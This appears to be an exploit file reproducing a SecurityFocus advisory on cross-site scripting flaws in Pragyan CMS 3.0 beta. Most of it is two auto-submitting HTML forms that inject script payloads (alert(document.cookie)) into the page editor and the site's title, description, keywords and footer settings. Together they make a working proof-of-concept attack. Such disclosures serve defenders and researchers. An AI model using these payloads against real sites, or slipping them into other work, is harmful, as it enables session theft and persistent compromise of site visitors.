@@ -1,0 +1,28 @@
+source: http://www.securityfocus.com/bid/46683/info
+
+Pragyan CMS is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+Pragyan CMS 3.0 beta is vulnerable; other versions may also be affected. 
+
+<form action="http://host/?page=/MY_PAGE_URL/&action=edit" method="post" name="main">
+<input type="hidden" name="CKEditor1" value=&#039;page content"><script>alert(document.cookie)</script>&#039;>
+</form>
+<script>
+document.main.submit();
+</script>
+
+
+<form action="http://host/?page=/&action=admin&subaction=global" method="post" name="main">
+<input type="hidden" name="cms_title" value="Pragyan CMS">
+<input type="hidden" name="cms_desc" value=&#039;desc3"><script>alert(document.cookie)</script>&#039;>
+<input type="hidden" name="cms_keywords" value=&#039;Pragyan CMS"><script>alert(document.cookie)</script>&#039;>
+<input type="hidden" name="cms_footer" value=&#039;Powered by Praygan CMS"><script>alert(document.cookie)</script>&#039;>
+<input type="hidden" name="cms_email" value="email@example.com">
+<input type="hidden" name="default_template" value="crystalx">
+<input type="hidden" name="update_global_settings" value="">
+</form>
+<script>
+document.main.submit();
+</script>
